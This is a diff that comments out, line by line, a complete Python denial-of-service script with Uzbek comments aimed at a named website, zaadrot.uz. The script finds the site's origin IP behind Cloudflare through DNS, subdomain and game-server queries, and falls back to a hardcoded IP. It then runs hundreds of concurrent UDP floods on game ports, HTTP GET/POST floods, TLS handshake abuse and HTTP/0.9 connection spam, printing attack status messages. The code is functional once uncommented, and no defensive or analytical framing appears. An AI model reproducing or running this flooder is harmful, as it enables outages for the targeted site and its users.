@@ -426,158 +426,158 @@
 
 
 
-import socket
-import asyncio
-import aiohttp
-import random
-import time
-import ssl
-import subprocess
-import re
+# import socket
+# import asyncio
+# import aiohttp
+# import random
+# import time
+# import ssl
+# import subprocess
+# import re
 
-# ========== HAQIQIY SERVER IP NI AVTOMATIK TOPISH ==========
-def find_real_ip(domain="zaadrot.uz"):
-    # 1. DNS A yozuvlarini tekshirish (Cloudflare IP ni filtrlaymiz)
-    try:
-        ips = socket.getaddrinfo(domain, 80, socket.AF_INET, socket.SOCK_STREAM)
-        for ip_info in ips:
-            ip = ip_info[4][0]
-            # Cloudflare IP diapazonlarini filtrlaymiz
-            if not ip.startswith(("172.67.", "104.", "162.", "188.")):
-                print(f"[+] Haqiqiy IP topildi (DNS): {ip}")
-                return ip
-    except:
-        pass
+# # ========== HAQIQIY SERVER IP NI AVTOMATIK TOPISH ==========
+# def find_real_ip(domain="zaadrot.uz"):
+#     # 1. DNS A yozuvlarini tekshirish (Cloudflare IP ni filtrlaymiz)
+#     try:
+#         ips = socket.getaddrinfo(domain, 80, socket.AF_INET, socket.SOCK_STREAM)
+#         for ip_info in ips:
+#             ip = ip_info[4][0]
+#             # Cloudflare IP diapazonlarini filtrlaymiz
+#             if not ip.startswith(("172.67.", "104.", "162.", "188.")):
+#                 print(f"[+] Haqiqiy IP topildi (DNS): {ip}")
+#                 return ip
+#     except:
+#         pass
     
-    # 2. Subdomainlarni tekshirish (cs2, game, api)
-    subdomains = [f"{prefix}.{domain}" for prefix in ["cs2", "game", "api", "play", "server"]]
-    for sub in subdomains:
-        try:
-            ip = socket.gethostbyname(sub)
-            if not ip.startswith(("172.67.", "104.", "162.", "188.")):
-                print(f"[+] Haqiqiy IP topildi (subdomain): {sub} -> {ip}")
-                return ip
-        except:
-            pass
+#     # 2. Subdomainlarni tekshirish (cs2, game, api)
+#     subdomains = [f"{prefix}.{domain}" for prefix in ["cs2", "game", "api", "play", "server"]]
+#     for sub in subdomains:
+#         try:
+#             ip = socket.gethostbyname(sub)
+#             if not ip.startswith(("172.67.", "104.", "162.", "188.")):
+#                 print(f"[+] Haqiqiy IP topildi (subdomain): {sub} -> {ip}")
+#                 return ip
+#         except:
+#             pass
     
-    # 3. O'yin serveriga A2S_INFO so'rov yuborib, IP ni aniqlash
-    try:
-        # UDP port 27015 ga so'rov yuboramiz
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(2)
-        query = b"\xff\xff\xff\xffTSource Engine Query\x00"
-        sock.sendto(query, (domain, 27015))
-        data, addr = sock.recvfrom(1024)
-        ip = addr[0]
-        if not ip.startswith(("172.67.", "104.", "162.", "188.")):
-            print(f"[+] Haqiqiy IP topildi (A2S_INFO): {ip}")
-            return ip
-    except:
-        pass
+#     # 3. O'yin serveriga A2S_INFO so'rov yuborib, IP ni aniqlash
+#     try:
+#         # UDP port 27015 ga so'rov yuboramiz
+#         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#         sock.settimeout(2)
+#         query = b"\xff\xff\xff\xffTSource Engine Query\x00"
+#         sock.sendto(query, (domain, 27015))
+#         data, addr = sock.recvfrom(1024)
+#         ip = addr[0]
+#         if not ip.startswith(("172.67.", "104.", "162.", "188.")):
+#             print(f"[+] Haqiqiy IP topildi (A2S_INFO): {ip}")
+#             return ip
+#     except:
+#         pass
     
-    # 4. Agar topilmasa, qo'lda kiritishni so'raymiz
-    print("[!] Haqiqiy IP avtomatik topilmadi.")
-    print("[!] Iltimos, qo'lda tekshiring:")
-    print(f"  - nslookup {domain}")
-    print(f"  - nslookup cs2.{domain}")
-    print(f"  - ping {domain}")
-    return None
+#     # 4. Agar topilmasa, qo'lda kiritishni so'raymiz
+#     print("[!] Haqiqiy IP avtomatik topilmadi.")
+#     print("[!] Iltimos, qo'lda tekshiring:")
+#     print(f"  - nslookup {domain}")
+#     print(f"  - nslookup cs2.{domain}")
+#     print(f"  - ping {domain}")
+#     return None
 
-TARGET_IP = find_real_ip("zaadrot.uz")
-if not TARGET_IP:
-    # Qo'lda o'rnatish (misol uchun, o'zingizni IP bilan almashtiring)
-    TARGET_IP = "84.54.82.227"  # BU YERGA O'Z IP NIGIZNI YOZING
+# TARGET_IP = find_real_ip("zaadrot.uz")
+# if not TARGET_IP:
+#     # Qo'lda o'rnatish (misol uchun, o'zingizni IP bilan almashtiring)
+#     TARGET_IP = "84.54.82.227"  # BU YERGA O'Z IP NIGIZNI YOZING
 
-TARGET_DOMAIN = "zaadrot.uz"
-GAME_PORTS = list(range(27015, 27031))
-CONCURRENT_TASKS = 300
+# TARGET_DOMAIN = "zaadrot.uz"
+# GAME_PORTS = list(range(27015, 27031))
+# CONCURRENT_TASKS = 300
 
-print("=" * 60)
-print("[*] ZAADROT.UZ - HAQIQIY IP BILAN HUJUM")
-print(f"[*] IP: {TARGET_IP}")
-print("[*] Vazifalar: 300 (thread emas)")
-print("[*] Press Ctrl+C to stop")
-print("=" * 60)
+# print("=" * 60)
+# print("[*] ZAADROT.UZ - HAQIQIY IP BILAN HUJUM")
+# print(f"[*] IP: {TARGET_IP}")
+# print("[*] Vazifalar: 300 (thread emas)")
+# print("[*] Press Ctrl+C to stop")
+# print("=" * 60)
 
-# UDP socket
-udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-udp_data = b"\xff\xff\xff\xff" + b"X" * 1400
-query_data = b"\xff\xff\xff\xffTSource Engine Query\x00"
+# # UDP socket
+# udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+# udp_data = b"\xff\xff\xff\xff" + b"X" * 1400
+# query_data = b"\xff\xff\xff\xffTSource Engine Query\x00"
 
-async def udp_flood():
-    loop = asyncio.get_event_loop()
-    while True:
-        port = random.choice(GAME_PORTS)
-        await loop.sock_sendto(udp_sock, udp_data, (TARGET_IP, port))
-        await loop.sock_sendto(udp_sock, query_data, (TARGET_IP, port))
-        await loop.sock_sendto(udp_sock, b"\x00"*1400, (TARGET_IP, port))
-        await asyncio.sleep(0.0005)
+# async def udp_flood():
+#     loop = asyncio.get_event_loop()
+#     while True:
+#         port = random.choice(GAME_PORTS)
+#         await loop.sock_sendto(udp_sock, udp_data, (TARGET_IP, port))
+#         await loop.sock_sendto(udp_sock, query_data, (TARGET_IP, port))
+#         await loop.sock_sendto(udp_sock, b"\x00"*1400, (TARGET_IP, port))
+#         await asyncio.sleep(0.0005)
 
-async def http_flood(session):
-    while True:
-        try:
-            async with session.get(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.2) as resp:
-                pass
-            async with session.post(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, data={"x": "y"*5000}, timeout=0.2) as resp:
-                pass
-            async with session.get(f"https://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.2, ssl=False) as resp:
-                pass
-        except:
-            pass
-        await asyncio.sleep(0.001)
+# async def http_flood(session):
+#     while True:
+#         try:
+#             async with session.get(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.2) as resp:
+#                 pass
+#             async with session.post(f"http://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, data={"x": "y"*5000}, timeout=0.2) as resp:
+#                 pass
+#             async with session.get(f"https://{TARGET_IP}/", headers={"Host": TARGET_DOMAIN}, timeout=0.2, ssl=False) as resp:
+#                 pass
+#         except:
+#             pass
+#         await asyncio.sleep(0.001)
 
-async def ssl_reneg():
-    loop = asyncio.get_event_loop()
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
-            await loop.sock_connect(sock, (TARGET_IP, 443))
-            ctx = ssl.create_default_context()
-            ssl_sock = ctx.wrap_socket(sock, server_hostname=TARGET_DOMAIN, do_handshake_on_connect=False)
-            for _ in range(10):
-                await loop.sock_sendall(ssl_sock, b"")
-                ssl_sock.do_handshake()
-            ssl_sock.close()
-        except:
-            pass
-        await asyncio.sleep(0.001)
+# async def ssl_reneg():
+#     loop = asyncio.get_event_loop()
+#     while True:
+#         try:
+#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#             sock.settimeout(0.5)
+#             await loop.sock_connect(sock, (TARGET_IP, 443))
+#             ctx = ssl.create_default_context()
+#             ssl_sock = ctx.wrap_socket(sock, server_hostname=TARGET_DOMAIN, do_handshake_on_connect=False)
+#             for _ in range(10):
+#                 await loop.sock_sendall(ssl_sock, b"")
+#                 ssl_sock.do_handshake()
+#             ssl_sock.close()
+#         except:
+#             pass
+#         await asyncio.sleep(0.001)
 
-async def http_09():
-    loop = asyncio.get_event_loop()
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
-            await loop.sock_connect(sock, (TARGET_IP, 80))
-            await loop.sock_sendall(sock, b"GET / HTTP/0.9\r\n\r\n")
-            sock.close()
-        except:
-            pass
-        await asyncio.sleep(0.001)
+# async def http_09():
+#     loop = asyncio.get_event_loop()
+#     while True:
+#         try:
+#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#             sock.settimeout(0.5)
+#             await loop.sock_connect(sock, (TARGET_IP, 80))
+#             await loop.sock_sendall(sock, b"GET / HTTP/0.9\r\n\r\n")
+#             sock.close()
+#         except:
+#             pass
+#         await asyncio.sleep(0.001)
 
-async def main():
-    conn = aiohttp.TCPConnector(limit=0, ssl=False)
-    async with aiohttp.ClientSession(connector=conn) as session:
-        tasks = []
-        for _ in range(80):
-            tasks.append(asyncio.create_task(udp_flood()))
-        for _ in range(100):
-            tasks.append(asyncio.create_task(http_flood(session)))
-        for _ in range(60):
-            tasks.append(asyncio.create_task(ssl_reneg()))
-        for _ in range(60):
-            tasks.append(asyncio.create_task(http_09()))
+# async def main():
+#     conn = aiohttp.TCPConnector(limit=0, ssl=False)
+#     async with aiohttp.ClientSession(connector=conn) as session:
+#         tasks = []
+#         for _ in range(80):
+#             tasks.append(asyncio.create_task(udp_flood()))
+#         for _ in range(100):
+#             tasks.append(asyncio.create_task(http_flood(session)))
+#         for _ in range(60):
+#             tasks.append(asyncio.create_task(ssl_reneg()))
+#         for _ in range(60):
+#             tasks.append(asyncio.create_task(http_09()))
         
-        print("[*] Barcha vazifalar ishga tushdi. 3-5 daqiqa kuting...")
-        print("[*] Saytni kuzating: https://zaadrot.uz")
-        try:
-            await asyncio.gather(*tasks)
-        except KeyboardInterrupt:
-            print("\n[!] Hujum to'xtatildi.")
+#         print("[*] Barcha vazifalar ishga tushdi. 3-5 daqiqa kuting...")
+#         print("[*] Saytni kuzating: https://zaadrot.uz")
+#         try:
+#             await asyncio.gather(*tasks)
+#         except KeyboardInterrupt:
+#             print("\n[!] Hujum to'xtatildi.")
 
-if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\n[!] Hujum to'xtatildi.")
+# if __name__ == "__main__":
+#     try:
+#         asyncio.run(main())
+#     except KeyboardInterrupt:
+#         print("\n[!] Hujum to'xtatildi.")
